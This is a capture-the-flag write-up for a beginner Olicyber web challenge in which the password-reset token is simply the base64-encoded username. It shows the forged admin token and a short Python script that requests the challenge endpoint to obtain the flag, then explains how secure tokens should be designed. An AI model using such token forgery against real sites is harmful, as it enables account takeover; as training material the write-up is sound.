---
title: "Password Changer 3000 — Insecure Token via Base64-Encoded Username"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "insecure-design", "base64", "python"]
difficulty: "beginner"
summary: "The password-reset token is simply the base64 encoding of the username. Encoding 'admin' and passing it as the token query parameter triggers the admin password change flow and reveals the flag."
---

## The Challenge

A password-reset endpoint at `/change-password.php` accepts a `token` query parameter to identify which account to reset. The token scheme has no signature, no expiry, and no randomness.

## Approach

The token is `base64(username)`. For the `admin` account:

```
base64("admin") = "YWRtaW4="
```

Pass this as `?token=YWRtaW4=` to trigger the admin reset flow. The server trusts the token, identifies the account as admin, and returns the flag.

## Solution

```python
import requests, base64

payload = "admin"
site = "http://password-changer.challs.olicyber.it/change-password.php?token="
r = requests.get(site + base64.b64encode(payload.encode()).decode())
print(r.text)
```

`base64.b64encode("admin".encode()).decode()` produces `YWRtaW4=`. The GET request returns the response body containing the flag.

## What I Learned

Password-reset tokens must be opaque, cryptographically random, single-use, and short-lived. A token that encodes the username in base64 provides zero security — base64 is recoverable and the token can be forged for any account without any secret material.
